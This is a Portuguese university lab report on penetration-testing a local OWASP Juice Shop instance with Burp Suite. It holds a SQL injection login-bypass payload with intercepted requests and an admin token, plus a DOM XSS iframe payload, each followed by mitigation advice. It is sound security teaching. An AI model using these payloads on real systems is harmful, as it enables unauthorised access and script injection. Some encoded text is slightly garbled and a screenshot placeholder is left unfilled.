# Trabalho T2.2 - Instalação de Servidor Web Vulnerável e Testes de Penetração

**Disciplina:** Segurança em Computação (2025/2)

**Alunos:** José Vitor Zorzal e Gustavo Breda Sarti

---

## 1. Instruções de Instalação e Configuração do Ambiente 

O ambiente escolhido para os testes de penetração foi o **OWASP Juice Shop**, uma aplicação web deliberadamente vulnerável.

### Requisitos de Software e Sistema Operacional 
* **Sistema Operacional Hospedeiro:** Windows 11 com WSL2 habilitado (Subsistema Windows para Linux).
* **Software de Containerização:** Docker Desktop.
* **Imagem Vulnerável:** `bkimminich/juice-shop:latest`

### Passo a Passo de Instalação e Execução 

1. **Baixar a imagem da aplicação:**
   ```bash
   docker pull bkimminich/juice-shop

2. **Iniciar o ambiente vulnerável:**
Foi definida a porta 3000 no hospedeiro.

   ```bash
   docker run --rm -d --name juiceshop_t2 -p 3000:3000 bkimminich/juice-shop

3. **Acesso à Aplicação:**
   
* URL: http://localhost:3000
* Porta: 3000
* Credenciais: A aplicação não possui credenciais padrão expostas intencionalmente.

4. **Como parar o ambiente vulnerável:**

   ```bash
   docker stop juiceshop_t2

## 2. Descrição Completa dos Experimentos Realizados 

### Ferramentas de Pentesting Utilizadas 

* Proxy de Interceptação: Burp Suite Community Edition 2026.1.4.0.

* Navegador: Chromium (Embutido nativamente no Burp Suite).

### Configurações Específicas 

O navegador embutido do Burp Suite foi utilizado para rotear o tráfego automaticamente através do proxy local 127.0.0.1:8080 , permitindo a interceptação, análise e modificação das requisições HTTP antes de serem enviadas ao servidor.

### Procedimento Experimental Geral 

1. Iniciar o Docker Desktop e o contêiner do Juice Shop.

2. Iniciar o Burp Suite Community e abrir a aba "Proxy" -> "Intercept".

3. Clicar em "Open Browser" dentro do Burp para abrir o navegador com o proxy já configurado.

4. Navegar até a URL da aplicação local.

## 3. Exploração de Vulnerabilidades 

### 3.1. Vulnerabilidade 1: SQL Injection (Authentication Bypass) 

* Objetivo do ataque: Burlar o mecanismo de autenticação para acessar a conta do usuário administrador sem possuir a senha.

* Passos realizados: 

1. No navegador do Burp, acessar a rota de login (/#/login).

2. Ativar a interceptação no Burp Suite (Intercept is on).

3. Preencher o campo de e-mail com o payload: ' or 1=1-- e qualquer caractere na senha.

4. Clicar em "Log in" e analisar a requisição retida no Burp.

5. Liberar a requisição (Forward) e observar o login bem-sucedido na interface.

* Requisição Enviada (Interceptada): 

  ```http
  POST /rest/user/login HTTP/1.1
  Host: localhost:3000
  Content-Length: 39
  sec-ch-ua-platform: "Windows"
  Accept-Language: pt-BR,pt;q=0.9
  Accept: application/json, text/plain, */*
  sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
  Content-Type: application/json
  sec-ch-ua-mobile: ?0
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
  Origin: http://localhost:3000
  Sec-Fetch-Site: same-origin
  Sec-Fetch-Mode: cors
  Sec-Fetch-Dest: empty
  Referer: http://localhost:3000/
  Connection: keep-alive

  {
    "email":"' or 1=1--",
    "password":"123"
  }

* Resposta Obtida: 

   ```http
   HTTP/1.1 200 OK
   Content-Type: application/json; charset=utf-8

   {"authentication":{"umail":"admin@juice-sh.op","id":1,"token":"eyJhbGciOiJIUzI1..."}}

   HTTP/1.1 200 OK
   Access-Control-Allow-Origin: *
   X-Content-Type-Options: nosniff
   X-Frame-Options: SAMEORIGIN
   Feature-Policy: payment 'self'
   X-Recruiting: /#/jobs
   Content-Type: application/json; charset=utf-8
   Content-Length: 799
   ETag: W/"31f-3vWb/KqSX6MtoxyknDTPLY2rKyo"
   Vary: Accept-Encoding
   Date: Fri, 20 Feb 2026 02:44:57 GMT
   Connection: keep-alive
   Keep-Alive: timeout=5

   {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDItMjAgMDI6Mzg6MjMuNDAxICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDItMjAgMDI6Mzg6MjMuNDAxICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3MTU1NTQ5OH0.jBX9_rtnd4fOpkdvjyx94gV3LIGuKP4vsp73kFb_qrsGfGqfGGTCKS8BlIiEeMkT20dfUHH6W9uIFITtL8voPteR4xVePsGTgvckYCaGx3TtVHi1zAI8rIFmJjoK_ajZ5isMrKRXHBeglEavpBsACJXICL4ZGM4-YMmgEGJmopo","bid":1,"umail":"admin@juice-sh.op"}}

* Evidência Visual: 

<img width="1209" height="638" alt="image" src="https://github.com/user-attachments/assets/8c2efb7d-cff4-499b-afff-170633a3a947" />

<img width="1861" height="688" alt="image" src="https://github.com/user-attachments/assets/f73b87fe-c872-405a-8252-5b24c94037f5" />

* Interpretação do Resultado: 
O banco de dados recebeu a string diretamente na query. O caractere ' fechou a instrução esperada, o or 1=1 forçou uma condição verdadeira que retorna o primeiro usuário do banco (o admin), e o -- comentou o restante da query que validaria a senha.

* Discussão sobre Mitigação:
A vulnerabilidade pode ser evitada utilizando Prepared Statements (Consultas Parametrizadas) ou frameworks ORM modernos. Isso garante que o banco de dados trate a entrada do usuário estritamente como um dado, e não como código executável.

### 3.2. Vulnerabilidade 2: DOM Cross-Site Scripting (XSS) 

* Objetivo do ataque: Injetar e executar um script malicioso no navegador da vítima através da barra de pesquisa.

* Passos realizados: 

1. Na interface principal, clicar no ícone de lupa (Search).

2. Inserir o payload de iframe no campo de busca: <iframe src="javascript:alert('XSS_T2.2')">

3. Pressionar Enter.

* Requisição Enviada: 

   ```http
   GET /rest/products/search?q=%3Ciframe%20src%3D%22javascript%3Aalert%BN%27XSS_T2.2%27%29%22%3E HTTP/1.1
   Host: localhost:3000

* Resposta Obtida: 

   ```http
   HTTP/1.1 200 OK
   Content-Type: application/json; charset=utf-8

   {"status":"success","data":[]}

* Evidência Visual: 

[COLE SEU PRINT AQUI - TELA DO NAVEGADOR MOSTRANDO A CAIXA DE ALERTA COM O SCRIPT EXECUTADO]


* Interpretação do Resultado:
O frontend da aplicação recebe o parâmetro de busca e o renderiza dinamicamente na página HTML sem realizar a devida codificação de saída. Isso faz com que o navegador interprete a tag <iframe> como um elemento HTML legítimo e execute o JavaScript.


* Discussão sobre Mitigação:
Deve-se implementar Output Encoding transformando caracteres especiais em entidades HTML seguras antes de renderizar dados fornecidos pelo usuário no navegador. Adicionalmente, implementar uma rigorosa Content Security Policy (CSP) mitigaria a execução de scripts não autorizados.
+1
